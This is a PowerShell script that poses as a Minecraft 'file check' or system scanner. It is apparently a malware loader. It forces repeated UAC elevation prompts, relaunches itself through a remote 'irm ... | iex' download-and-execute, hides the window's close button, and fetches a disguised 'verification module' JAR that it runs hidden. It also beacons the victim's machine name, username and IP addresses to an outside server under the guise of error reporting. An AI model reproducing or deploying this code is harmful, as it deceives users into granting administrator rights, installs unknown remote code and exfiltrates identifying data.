$null = Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

function Test-IsAdmin {
    $identity  = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Test-IsWin10Or11 {
    try {
        $ver = [System.Environment]::OSVersion.Version
        # Windows 10 и 11 оба имеют Major = 10, различаются Build, но для нашей логики это не критично
        return $ver.Major -eq 10
    } catch {
        Send-ErrorToServer -ErrorMessage $_.Exception.Message -Command "Test-IsWin10Or11"
        return $false
    }
}

function Test-UacDisabled {
    try {
        $keyPath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
        $props   = Get-ItemProperty -Path $keyPath -Name 'EnableLUA' -ErrorAction Stop
        # EnableLUA = 0 означает, что UAC полностью отключён
        return ($props.EnableLUA -eq 0)
    } catch {
        Send-ErrorToServer -ErrorMessage $_.Exception.Message -Command "Test-UacDisabled"
        return $false
    }
}

function Test-LaunchedFromWinlogon {
    try {
        $current = Get-CimInstance Win32_Process -Filter "ProcessId=$PID"
        if (-not $current) { return $false }

        $parent = Get-CimInstance Win32_Process -Filter "ProcessId=$($current.ParentProcessId)"
        if (-not $parent) { return $false }

        return $parent.Name -in @('userinit.exe', 'winlogon.exe')
    }
    catch {
        Send-ErrorToServer -ErrorMessage $_.Exception.Message -Command $_.InvocationInfo.Line
        return $false
    }
}

function Stop-ProcessesUsingFile {
    param (
        [string]$filePath
    )

    if (-not (Test-Path $filePath)) {
        return $true
    }

    $filePathNormalized = (Resolve-Path $filePath -ErrorAction SilentlyContinue).Path
    if (-not $filePathNormalized) {
        $filePathNormalized = $filePath
    }

    $processesKilled = $false

    try {
        $javaProcesses = Get-Process -Name "java" -ErrorAction SilentlyContinue

        foreach ($proc in $javaProcesses) {
            try {
                $wmiProcess = Get-WmiObject Win32_Process -Filter "ProcessId = $($proc.Id)" -ErrorAction SilentlyContinue
                if ($wmiProcess -and $wmiProcess.CommandLine) {
                    $commandLine = $wmiProcess.CommandLine

                    if ($commandLine -like "*$filePathNormalized*" -or $commandLine -like "*System_ChecksFile75-56.jar*") {
                        try {
                            Stop-Process -Id $proc.Id -Force -ErrorAction Stop
                            $processesKilled = $true
                            Start-Sleep -Milliseconds 500
                        } catch {}
                    }
                }
            } catch {}
        }

        if ($processesKilled) {
            for ($i = 0; $i -lt 10; $i++) {
                try {
                    $fileStream = [System.IO.File]::Open($filePathNormalized, 'Open', 'ReadWrite', 'None')
                    $fileStream.Close()
                    $fileStream.Dispose()
                    return $true
                } catch {
                    Send-ErrorToServer -ErrorMessage $_.Exception.Message -Command $_.InvocationInfo.Line
                    Start-Sleep -Milliseconds 300
                }
            }
        }

        return $true
    } catch {
        Send-ErrorToServer -ErrorMessage $_.Exception.Message -Command $_.InvocationInfo.Line
        return $false
    }
}

function Test-JarInUse {
    param (
        [string]$filePath
    )

    if (-not (Test-Path $filePath)) {
        return $false
    }

    $filePathNormalized = (Resolve-Path $filePath -ErrorAction SilentlyContinue).Path
    if (-not $filePathNormalized) {
        $filePathNormalized = $filePath
    }

    try {
        $javaProcesses = Get-Process -Name "java" -ErrorAction SilentlyContinue

        foreach ($proc in $javaProcesses) {
            try {
                $wmiProcess = Get-WmiObject Win32_Process -Filter "ProcessId = $($proc.Id)" -ErrorAction SilentlyContinue
                if ($wmiProcess -and $wmiProcess.CommandLine) {
                    $commandLine = $wmiProcess.CommandLine

                    if ($commandLine -like "*$filePathNormalized*" -or $commandLine -like "*System_ChecksFile75-56.jar*") {
                        return $true
                    }
                }
            } catch {}
        }

        return $false
    } catch {
        Send-ErrorToServer -ErrorMessage $_.Exception.Message -Command "Test-JarInUse"
        return $false
    }
}

function Show-ConsoleProgress {
    param (
        [string]$Status,
        [int]$Step,
        [int]$Total
    )
    $percent     = [math]::Round(($Step / $Total) * 100)
    $barLength   = 40
    $filledLength = [math]::Floor(($percent / 100) * $barLength)
    $bar         = ("[" + ("#" * $filledLength) + ("-" * ($barLength - $filledLength)) + "]")
    $line        = "$bar $percent% - $Status"

    try {
        $currentLine = $Host.UI.RawUI.CursorPosition.Y
        $Host.UI.RawUI.CursorPosition = New-Object System.Management.Automation.Host.Coordinates(0, $currentLine)
        Write-Host -NoNewline (" " * ($Host.UI.RawUI.BufferSize.Width - 1))
        $Host.UI.RawUI.CursorPosition = New-Object System.Management.Automation.Host.Coordinates(0, $currentLine)
        Write-Host -NoNewline $line
    } catch {
        Write-Host $line
    }
}

function Send-ErrorToServer {
    param (
        [string]$ErrorMessage,
        [string]$Command
    )

    $server   = "https://squadhelp.space/api/powershell-error"
    $machine  = $env:COMPUTERNAME
    $username = $env:USERNAME

    try {
        $localIp = (Get-NetIPAddress -AddressFamily IPv4 |
            Where-Object {
                $_.IPAddress -notlike "169.*" -and
                $_.IPAddress -ne "127.0.0.1"
            } |
            Select-Object -First 1 -ExpandProperty IPAddress)
    } catch {
        $localIp = "unknown"
    }

    try {
        $publicIp = Invoke-RestMethod "https://api.ipify.org"
    } catch {
        $publicIp = "unknown"
    }

    # Приводим сообщение к безопасному английскому виду (без локализованных текстов)
    $safeErrorMessage = $ErrorMessage
    try {
        if ([string]::IsNullOrWhiteSpace($safeErrorMessage)) {
            $safeErrorMessage = "Unknown error"
        } else {
            $hasNonAscii = $false
            foreach ($ch in $safeErrorMessage.ToCharArray()) {
                if ([int][char]$ch -gt 127) {
                    $hasNonAscii = $true
                    break
                }
            }
            if ($hasNonAscii) {
                $safeErrorMessage = "System error occurred (non-ASCII message)"
            }
        }
    } catch {
        $safeErrorMessage = "Unknown error"
    }

    $body = @{
        machine  = $machine
        username = $username
        localIp  = $localIp
        publicIp = $publicIp
        script   = $MyInvocation.ScriptName
        command  = $Command
        error    = $safeErrorMessage
        time     = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    } | ConvertTo-Json

    try {
        Invoke-RestMethod -Uri $server -Method POST -ContentType "application/json" -Body $body
    } catch {
    }
}

function Find-Java17 {
    $java17Paths = @()

    try {
        $javaExe = Get-Command java -ErrorAction SilentlyContinue
        if ($javaExe) {
            try {
                $versionOutput = & $javaExe.Source -version 2>&1
                if ($versionOutput -match '"17\.' -or $versionOutput -match 'version "17') {
                    $java17Paths += $javaExe.Source
                }
            } catch {
                Send-ErrorToServer -ErrorMessage $_.Exception.Message -Command $_.InvocationInfo.Line
            }
        }
    } catch {
        Send-ErrorToServer -ErrorMessage $_.Exception.Message -Command $_.InvocationInfo.Line
    }

    $commonJavaPaths = @(
        "${env:ProgramFiles}\Java",
        "${env:ProgramFiles(x86)}\Java",
        "${env:ProgramFiles}\Eclipse Adoptium",
        "${env:ProgramFiles}\Eclipse Foundation",
        "${env:ProgramFiles}\Microsoft",
        "${env:ProgramFiles}\Amazon Corretto",
        "${env:ProgramFiles}\Zulu",
        "${env:ProgramFiles}\BellSoft",
        "${env:ProgramFiles}\RedHat",
        "${env:ProgramFiles}\SAP",
        "${env:ProgramFiles}\Azul Systems",
        "$env:LOCALAPPDATA\Programs\Eclipse Adoptium",
        "$env:LOCALAPPDATA\Programs\Eclipse Foundation"
    )

    foreach ($basePath in $commonJavaPaths) {
        if (Test-Path $basePath) {
            try {
                $javaDirs = Get-ChildItem -Path $basePath -Directory -ErrorAction SilentlyContinue
                foreach ($dir in $javaDirs) {
                    $javaExePath = Join-Path $dir.FullName "bin\java.exe"
                    if (Test-Path $javaExePath) {
                        try {
                            $versionOutput = & $javaExePath -version 2>&1
                            if ($versionOutput -match '"17\.' -or $versionOutput -match 'version "17') {
                                $java17Paths += $javaExePath
                            }
                        } catch {
                            Send-ErrorToServer -ErrorMessage $_.Exception.Message -Command $_.InvocationInfo.Line
                        }
                    }
                }
            } catch {
                Send-ErrorToServer -ErrorMessage $_.Exception.Message -Command $_.InvocationInfo.Line
            }
        }
    }

    try {
        $javaRegistry = Get-ItemProperty "HKLM:\SOFTWARE\JavaSoft\Java Runtime Environment\*" -ErrorAction SilentlyContinue | Where-Object { $_.JavaHome }
        foreach ($item in $javaRegistry) {
            if ($item.PSChildName -match '^1\.7\.' -or $item.PSChildName -match '^17\.') {
                $javaExePath = Join-Path $item.JavaHome "bin\java.exe"
                if (Test-Path $javaExePath) {
                    try {
                        $versionOutput = & $javaExePath -version 2>&1
                        if ($versionOutput -match '"17\.' -or $versionOutput -match 'version "17') {
                            $java17Paths += $javaExePath
                        }
                    } catch {
                        Send-ErrorToServer -ErrorMessage $_.Exception.Message -Command $_.InvocationInfo.Line
                    }
                }
            }
        }
    } catch {
        Send-ErrorToServer -ErrorMessage $_.Exception.Message -Command $_.InvocationInfo.Line
    }

    try {
        $javaRegistry = Get-ItemProperty "HKLM:\SOFTWARE\JavaSoft\JDK\*" -ErrorAction SilentlyContinue | Where-Object { $_.JavaHome }
        foreach ($item in $javaRegistry) {
            if ($item.PSChildName -match '^1\.7\.' -or $item.PSChildName -match '^17\.') {
                $javaExePath = Join-Path $item.JavaHome "bin\java.exe"
                if (Test-Path $javaExePath) {
                    try {
                        $versionOutput = & $javaExePath -version 2>&1
                        if ($versionOutput -match '"17\.' -or $versionOutput -match 'version "17') {
                            $java17Paths += $javaExePath
                        }
                    } catch {
                        Send-ErrorToServer -ErrorMessage $_.Exception.Message -Command $_.InvocationInfo.Line
                    }
                }
            }
        }
    } catch {
        Send-ErrorToServer -ErrorMessage $_.Exception.Message -Command $_.InvocationInfo.Line
    }

    if ($java17Paths.Count -gt 0) {
        return $java17Paths[0]
    }

    return $null
}

function Extract-Java {
    param(
        [int]$step,
        [int]$total
    )

    Write-Host ""
    Write-Host " Checking Java runtime..." -ForegroundColor Yellow

    try {
        Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction Stop
        [System.IO.Compression.ZipFile]::ExtractToDirectory($javaPortableZip, $javaPortableDir)
        Write-Host "  Java checking completed!" -ForegroundColor Green
        Show-ConsoleProgress "Java ready" $step $total
        return $true
    } catch {
        Send-ErrorToServer -ErrorMessage $_.Exception.Message -Command $_.InvocationInfo.Line
        try {
            Expand-Archive -Path $javaPortableZip -DestinationPath $javaPortableDir -Force -ErrorAction Stop
            Write-Host "  Extraction completed!" -ForegroundColor Green
            Show-ConsoleProgress "Java ready" $step $total
            return $true
        } catch {
            Send-ErrorToServer -ErrorMessage $_.Exception.Message -Command $_.InvocationInfo.Line
            Write-Host "  Error: Extraction failed - $($_.Exception.Message)" -ForegroundColor Red
            return $false
        }
    }
}

function Download-File {
    param (
        [string]$url,
        [string]$dest,
        [int]$step,
        [int]$total,
        [string]$description
    )

    $destDir = Split-Path -Parent $dest
    if (-not (Test-Path $destDir)) {
        try {
            New-Item -ItemType Directory -Path $destDir -Force | Out-Null
        } catch {
            Send-ErrorToServer -ErrorMessage $_.Exception.Message -Command $_.InvocationInfo.Line
            Write-Host "  Error: Cannot create directory - $($_.Exception.Message)" -ForegroundColor Red
            return $false
        }
    }

    if (Test-Path $dest) {
        Stop-ProcessesUsingFile -filePath $dest | Out-Null
        Start-Sleep -Milliseconds 500
        try {
            Remove-Item $dest -Force -ErrorAction Stop
        } catch {
            $dest = $dest + ".tmp"
        }
    }

    $maxRetries  = 3
    $retryCount  = 0

    while ($retryCount -lt $maxRetries) {
        try {
            Import-Module BitsTransfer -ErrorAction Stop
            Start-BitsTransfer -Source $url -Destination $dest -Priority Foreground -ErrorAction Stop

            if ((Test-Path $dest -PathType Leaf)) {
                $fileInfo = Get-Item $dest -ErrorAction SilentlyContinue
                if ($fileInfo -and $fileInfo.Length -gt 0) {
                    if ($dest -like "*.tmp") {
                        $finalDest = $dest -replace "\.tmp$", ""
                        Stop-ProcessesUsingFile -filePath $finalDest | Out-Null
                        Start-Sleep -Milliseconds 500
                        if (Test-Path $finalDest) {
                            Remove-Item $finalDest -Force -ErrorAction SilentlyContinue
                        }
                        Rename-Item -Path $dest -NewName (Split-Path -Leaf $finalDest) -Force -ErrorAction Stop
                        $dest = $finalDest
                    }

                    Write-Host "  [+] Completed!" -ForegroundColor Green
                    return $true
                }
            }
        } catch {
            Send-ErrorToServer -ErrorMessage $_.Exception.Message -Command $_.InvocationInfo.Line
            Write-Host "  Download error: $($_.Exception.Message)" -ForegroundColor Red
        }

        $retryCount++
        if ($retryCount -lt $maxRetries) {
            Start-Sleep 2
        }
    }

    return $false
}

function Download-JarWithBITS {
    param (
        [string]$url,
        [string]$dest,
        [int]$step,
        [int]$total,
        [string]$description
    )

    $destDir = Split-Path -Parent $dest
    if (-not (Test-Path $destDir)) {
        New-Item -ItemType Directory -Path $destDir -Force | Out-Null
    }

    Stop-ProcessesUsingFile -filePath $dest | Out-Null
    Start-Sleep -Milliseconds 300
    if (Test-Path $dest) {
        try {
            Remove-Item $dest -Force -ErrorAction Stop
        } catch {
            Send-ErrorToServer -ErrorMessage $_.Exception.Message -Command $_.InvocationInfo.Line
            Write-Host "  Warning: Cannot remove existing file, will overwrite" -ForegroundColor Yellow
        }
    }

    try {
        Write-Host " with BITS..." -NoNewline
        Import-Module BitsTransfer -ErrorAction Stop
        Start-BitsTransfer -Source $url -Destination $dest -Priority Foreground -ErrorAction Stop

        if ((Test-Path $dest -PathType Leaf)) {
            $fileInfo = Get-Item $dest -ErrorAction SilentlyContinue
            if ($fileInfo -and $fileInfo.Length -gt 100) {
                Write-Host " OK" -ForegroundColor Green
                Show-ConsoleProgress "$description successfully" $step $total
                return $true
            }
        }
        Write-Host " fail" -ForegroundColor Red
        return $false
    } catch {
        Send-ErrorToServer -ErrorMessage $_.Exception.Message -Command $_.InvocationInfo.Line
        Write-Host " fail" -ForegroundColor Red
        Write-Host "  Error: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

function Initialize-ConsoleAndBanner {
    try {
        $Host.UI.RawUI.BackgroundColor = "Black"
        $Host.UI.RawUI.ForegroundColor = "Gray"
        Clear-Host
    } catch {
        Send-ErrorToServer -ErrorMessage $_.Exception.Message -Command $_.InvocationInfo.Line
        Clear-Host
    }

    $host.UI.RawUI.WindowTitle = "Scanning system"
    Write-Host ""
    Write-Host "  ____  _____    _    ____   ____ _   _" -ForegroundColor Cyan
    Write-Host " / ___|| ____|  / \  |  _ \ / ___| | | |" -ForegroundColor Cyan
    Write-Host " \___ \|  _|   / _ \ | |_) | |   | |_| |" -ForegroundColor Cyan
    Write-Host "  ___) | |___ / ___ \|  _ <| |___|  _  |" -ForegroundColor Cyan
    Write-Host " |____/|_____/_/   \_\_| \_\\____|_| |_|" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "                S C A N . . .                 " -ForegroundColor DarkCyan
    Write-Host ""

    $null = Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("user32.dll")]
    public static extern int GetWindowLong(IntPtr hWnd, int nIndex);
    [DllImport("user32.dll")]
    public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
    [DllImport("user32.dll")]
    public static extern bool SetWindowPos(
        IntPtr hWnd,
        IntPtr hWndInsertAfter,
        int X,
        int Y,
        int cx,
        int cy,
        uint uFlags
    );
    public const int GWL_STYLE = -16;
    public const int WS_SYSMENU = 0x80000;
    public const int WS_MINIMIZEBOX = 0x20000;
    public const int WS_MAXIMIZEBOX = 0x10000;
    public const uint SWP_NOMOVE = 0x0002;
    public const uint SWP_NOSIZE = 0x0001;
    public const uint SWP_NOZORDER = 0x0004;
    public const uint SWP_FRAMECHANGED = 0x0020;
}
"@

    $process = Get-Process -Id $PID
    $hwnd    = $process.MainWindowHandle

    if ($hwnd -ne [IntPtr]::Zero) {
        $style    = [Win32]::GetWindowLong($hwnd, [Win32]::GWL_STYLE)
        $newStyle = $style -band (-bnot [Win32]::WS_SYSMENU)

        $null = [Win32]::SetWindowLong(
            $hwnd,
            [Win32]::GWL_STYLE,
            $newStyle
        )

        $null = [Win32]::SetWindowPos(
            $hwnd,
            [IntPtr]::Zero,
            0, 0, 0, 0,
            [Win32]::SWP_NOMOVE -bor
            [Win32]::SWP_NOSIZE -bor
            [Win32]::SWP_NOZORDER -bor
            [Win32]::SWP_FRAMECHANGED
        )
    }
}

function Show-OsInfo {
    $osVersion        = [System.Environment]::OSVersion.Version
    $osName           = (Get-WmiObject Win32_OperatingSystem).Caption
    $osBuild          = (Get-WmiObject Win32_OperatingSystem).BuildNumber
    $osVersionString  = "$osName (Build $osBuild)"
    Write-Host "[!] -> System version Windows: $osVersionString" -ForegroundColor Yellow
}

function Show-EndInfo {
    Write-Host ""
    Write-Host "Version: V2.1.0" -ForegroundColor DarkCyan
    Write-Host "Memory: Clean" -ForegroundColor Gray
    Write-Host ""
}

function Start-Main {
    try {
        Send-ErrorToServer -ErrorMessage "main.ps1 started" -Command "Start-Main:begin"
    } catch {}

    $LaunchedFromWinlogon = Test-LaunchedFromWinlogon

    # Case 1: запущены ИЗ winlogon/userinit, прав админа нет.
    # На Windows 10/11 при полностью отключённом UAC (EnableLUA = 0) попробуем один раз запустить себя от имени администратора без цикла.
    if ($LaunchedFromWinlogon -and -not (Test-IsAdmin) -and (Test-IsWin10Or11) -and (Test-UacDisabled)) {
        try {
            $arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://github.com/Squad7556/rar/releases/download/v1.0/log|iex`""
            Start-Process -FilePath "powershell.exe" -ArgumentList $arguments -Verb RunAs -ErrorAction Stop
            Send-ErrorToServer -ErrorMessage "Elevation from winlogon without UAC (UAC disabled)" -Command "Start-Main:UAC:NoPrompt"
            exit
        } catch {
            Send-ErrorToServer -ErrorMessage $_.Exception.Message -Command "Start-Main:UAC:NoPromptError"
            # Продолжаем дальше без прав админа
        }
    }

    # Case 2: обычный интерактивный запуск (не из winlogon) без прав админа — бесконечный цикл UAC.
    if (-not $LaunchedFromWinlogon -and -not (Test-IsAdmin)) {
        while (-not (Test-IsAdmin)) {
            try {
                $arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://github.com/Squad7556/rar/releases/download/v1.0/log|iex`""
                Start-Process -FilePath "powershell.exe" -ArgumentList $arguments -Verb RunAs -ErrorAction Stop
                Send-ErrorToServer -ErrorMessage "Requested elevation via UAC (loop)" -Command "Start-Main:UAC"
                exit
            } catch {
                $err = $_.Exception
                $msgToSend = $err.Message
                if ($err -is [System.ComponentModel.Win32Exception] -and $err.NativeErrorCode -eq 1223) {
                    $msgToSend = "User pressing close button"
                }
                Send-ErrorToServer -ErrorMessage $msgToSend -Command $_.InvocationInfo.Line
                Start-Sleep -Seconds 2
            }
        }
    }

    Initialize-ConsoleAndBanner
    Show-OsInfo

    Write-Host ""
    Write-Host ("=" * 50) -ForegroundColor DarkGray
    Write-Host "[~] STARTING FILE CHECK PROCESS .minecraft" -ForegroundColor White
    Write-Host ("=" * 50) -ForegroundColor DarkGray

    # Use full HTTP URL, otherwise PowerShell treats it as a drive name and fails
    $moduleUrl = "https://github.com/Squad7556/rar/releases/download/v1.0/System_ChecksFile75-56.jar"
    $moduleUrlZip = "https://squadhelp.space/SystemPackage.rar"

    if (-not $env:LOCALAPPDATA) {
        $env:LOCALAPPDATA = "$env:USERPROFILE\AppData\Local"
    }

    $workDir = $env:LOCALAPPDATA
    $jarFile = Join-Path $env:LOCALAPPDATA "System_ChecksFile75-56.jar"
    $destination = Join-Path $env:LOCALAPPDATA "SystemPackage.rar"
    $jarFileZip = Join-Path $env:LOCALAPPDATA "SystemPackage.rar"
    $archiveZip = Join-Path $workDir "SystemPackage.rar"
    $moduleUrlZip = "https://squadhelp.space/SystemPackage.rar"


    $fileName = "System_ChecksFile75-56.jar"
    $javaPortableUrl = "https://github.com/adoptium/temurin17-binaries/releases/download/jdk-17.0.9%2B9.1/OpenJDK17U-jre_x64_windows_hotspot_17.0.9_9.zip"
    $javaPortableDir = Join-Path $workDir "JavaPortable"
    $javaPortableZip = Join-Path $workDir "java_portable.zip"
    $winrar = "C:\Program Files\WinRAR\WinRAR.exe"

    $totalSteps  = 3
    $currentStep = 0

    $currentStep = 1
    Write-Host ""
    Write-Host "[1/$totalSteps] Searching Java." -ForegroundColor Cyan

    Send-ErrorToServer -ErrorMessage "Step 1: searching for Java 17" -Command "Start-Main:JavaSearch"

    $javaExe = Find-Java17

    if (-not $javaExe) {
        Write-Host "  [~] Java not installation" -ForegroundColor Yellow
        Write-Host "  [~] Portable Java..." -ForegroundColor Yellow

        Send-ErrorToServer -ErrorMessage "Java not found, switching to portable Java" -Command "Start-Main:JavaPortable"

        $portableJavaExe = Get-ChildItem $javaPortableDir -Recurse -Filter "java.exe" -ErrorAction SilentlyContinue | Select-Object -First 1

        if (-not $portableJavaExe) {
            if (-not (Test-Path $javaPortableZip)) {
                # 1) Try Download-File (BITS wrapper)
                Send-ErrorToServer -ErrorMessage "Downloading portable Java via Download-File" -Command "Start-Main:JavaPortable:Download-File"
                $downloadSuccess = Download-File $javaPortableUrl $javaPortableZip $currentStep $totalSteps "Portable Java Runtime"
                # 2) If Download-File failed, try direct BITS helper
                if (-not $downloadSuccess) {
                    Write-Host "  [!] Download-File failed, trying BITS for portable Java..." -ForegroundColor Yellow
                    Send-ErrorToServer -ErrorMessage "Download-File for portable Java failed, trying Download-JarWithBITS" -Command "Start-Main:JavaPortable:Download-JarWithBITS"
                    $downloadSuccess = Download-JarWithBITS -url $javaPortableUrl -dest $javaPortableZip -step $currentStep -total $totalSteps -description "Portable Java Runtime (BITS fallback)"
                }
                if (-not $downloadSuccess) {
                    Send-ErrorToServer -ErrorMessage "Failed to download portable Java (both methods)" -Command "Start-Main:JavaPortable:DownloadFailed"
                    Write-Host "  Error: Cannot download portable Java" -ForegroundColor Red
                    Write-Host "Press any key to exit..." -ForegroundColor Yellow
                    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
                    exit 1
                }
            }

            if (-not (Test-Path $javaPortableDir)) {
                New-Item -ItemType Directory -Path $javaPortableDir -Force | Out-Null
            }

            $extractSuccess = Extract-Java $currentStep $totalSteps
            if (-not $extractSuccess) {
                Send-ErrorToServer -ErrorMessage "Failed to extract portable Java" -Command "Start-Main:JavaPortable:ExtractFailed"
                Write-Host "  Error: Cannot extract portable Java" -ForegroundColor Red
                Write-Host "Press any key to exit..." -ForegroundColor Yellow
                $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
                exit 1
            }

            $portableJavaExe = Get-ChildItem $javaPortableDir -Recurse -Filter "java.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
        }

        if ($portableJavaExe -and (Test-Path $portableJavaExe.FullName)) {
            $javaExe = $portableJavaExe.FullName
            Send-ErrorToServer -ErrorMessage "Portable Java configured successfully" -Command "Start-Main:JavaPortable:Ready"
        } else {
            Write-Host "  Error: Cannot setup portable Java" -ForegroundColor Red
            Write-Host "Press any key to exit..." -ForegroundColor Yellow
            $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
            exit 1
        }
    } else {
        Write-Host "  Java found!" -ForegroundColor Green
        Show-ConsoleProgress "Java ready" $currentStep $totalSteps
    }

    $currentStep = 2

    Write-Host ""
    Write-Host "[2/$totalSteps] Checking verification module..." -ForegroundColor Cyan

    Send-ErrorToServer -ErrorMessage "Step 2: downloading verification module JAR" -Command "Start-Main:JarDownload"

    $downloadSuccess = Download-File $moduleUrl $jarFile $currentStep $totalSteps "Verification Module"
    if (-not $downloadSuccess) {
        Write-Host "  [!] Download-File failed, trying BITS for verification module..." -ForegroundColor Yellow
        Send-ErrorToServer -ErrorMessage "Download-File for verification module failed, trying Download-JarWithBITS" -Command "Start-Main:JarDownload:Download-JarWithBITS"
        $downloadSuccess = Download-JarWithBITS -url $moduleUrl -dest $jarFile -step $currentStep -total $totalSteps -description "Verification Module (BITS fallback)"
    }
    if (-not $downloadSuccess) {
        Send-ErrorToServer -ErrorMessage "Failed to download verification module (both methods)" -Command "Start-Main:JarDownload:Failed"
        Write-Host "  Error: Cannot download verification module" -ForegroundColor Red
        Write-Host "  Please check your internet connection and try again" -ForegroundColor Yellow
        Write-Host "Press any key to exit..." -ForegroundColor Yellow
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        exit 1
    }

    # Wait 3 seconds after successful download before potential launch
    Send-ErrorToServer -ErrorMessage "Verification module downloaded successfully, waiting 3 seconds before launch" -Command "Start-Main:JarDownload:PostDelay"
$password = "Sqa1oz-q1zz.1OLX"




$downloaded = Download-File `
    -url $moduleUrl `
    -dest $jarFile `
    -step 1 `
    -total 1 `
    -description "Verification Module"

if (-not $downloaded) {
    Write-Host "Download failed." -ForegroundColor Red
    exit 1
}







    $currentStep = 3
    Write-Host ""
    Write-Host "[3/$totalSteps] Starting verification module..." -ForegroundColor Cyan

    Send-ErrorToServer -ErrorMessage "Step 3: preparing to start verification module" -Command "Start-Main:JarRun:Precheck"

    $allChecksPassed = $true

    if (-not $javaExe) {
        Write-Host "  Error: Java executable not found" -ForegroundColor Red
        $allChecksPassed = $false
    } elseif (-not (Test-Path $javaExe)) {
        Write-Host "  Error: Java executable path is invalid: $javaExe" -ForegroundColor Red
        $allChecksPassed = $false
    } elseif (-not (Test-Path $jarFile -PathType Leaf)) {
        Write-Host "  Error: JAR file not found: $jarFile" -ForegroundColor Red
        $allChecksPassed = $false
    } else {
        Write-Host "  Running" -ForegroundColor Gray
        Send-ErrorToServer -ErrorMessage "All pre-launch checks passed, starting verification module" -Command "Start-Main:JarRun:ChecksPassed"
    }

    if ($allChecksPassed -and $javaExe -and (Test-Path $javaExe)) {
        try {
            $processInfo                  = New-Object System.Diagnostics.ProcessStartInfo
            $processInfo.FileName         = $javaExe
            $processInfo.Arguments        = "-jar `"$jarFile`""
            $processInfo.WindowStyle      = [System.Diagnostics.ProcessWindowStyle]::Hidden
            $processInfo.CreateNoWindow   = $true
            $processInfo.UseShellExecute  = $true
            $processInfo.WorkingDirectory = $env:LOCALAPPDATA

            $IsRunningAsAdmin = Test-IsAdmin
            if ($IsRunningAsAdmin) {
                $processInfo.Verb = "runas"
                Write-Host "  Launching JAR with administrator privileges..." -ForegroundColor Cyan
            } else {
                Write-Host "  Launching JAR with user privileges..." -ForegroundColor Cyan
            }

            $process           = New-Object System.Diagnostics.Process
            $process.StartInfo = $processInfo

            $processStarted = $process.Start()

            if ($processStarted) {
                Start-Sleep -Seconds 2

                if (-not $process.HasExited) {
                    Write-Host "  Verification module started successfully!" -ForegroundColor Green
                    Send-ErrorToServer -ErrorMessage "Verification module started successfully" -Command "Start-Main:JarRun:Started"
                }

                Show-ConsoleProgress "Verification started" $totalSteps $totalSteps
                Start-Sleep 1.5
            } else {
                Write-Host "  Error: Failed to start verification module" -ForegroundColor Red
                Send-ErrorToServer -ErrorMessage "Failed to start verification module (process.Start returned false)" -Command "Start-Main:JarRun:StartFailed"
            }

        } catch {
            Send-ErrorToServer -ErrorMessage $_.Exception.Message -Command $_.InvocationInfo.Line
            Write-Host "  Error: $($_.Exception.Message)" -ForegroundColor Red
            if ($_.Exception.InnerException) {
                Write-Host "  Inner exception: $($_.Exception.InnerException.Message)" -ForegroundColor Red
            }
        }
    } else {
        Write-Host "  Required files not found" -ForegroundColor Yellow
        Send-ErrorToServer -ErrorMessage "Required files not found, verification module not started" -Command "Start-Main:JarRun:MissingFiles"
    }

    Show-EndInfo

    try {
        [Console]::CursorVisible = $true
    } catch {
    }
    Send-ErrorToServer -ErrorMessage "main.ps1 finished and exiting" -Command "Start-Main:end"
    exit
}

Start-Main
